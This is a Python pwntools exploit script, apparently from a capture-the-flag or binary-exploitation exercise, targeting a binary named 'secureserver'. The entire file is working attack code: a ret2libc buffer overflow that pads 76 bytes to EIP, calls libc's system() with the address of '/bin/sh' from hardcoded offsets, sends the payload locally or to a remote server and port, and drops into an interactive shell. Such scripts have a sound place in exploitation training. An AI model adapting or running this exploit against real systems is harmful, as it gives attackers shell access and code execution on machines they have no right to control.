from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './secureserver'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Lib-c offsets, found manually (ASLR_OFF)
libc_base = 0xf7dba000
system = libc_base + 0x45040
binsh = libc_base + 0x18c338

# How many bytes to the instruction pointer (EIP)?
padding = 76

payload = flat(
    asm('nop') * padding,  # Padding up to EIP
    system,  # Address of system function in libc
    0x0,  # Return pointer
    binsh  # Address of /bin/sh in libc
)

# Write payload to file
write('payload', payload)

# Exploit
io.sendlineafter(b':', payload)

# Get flag/shell
io.interactive()
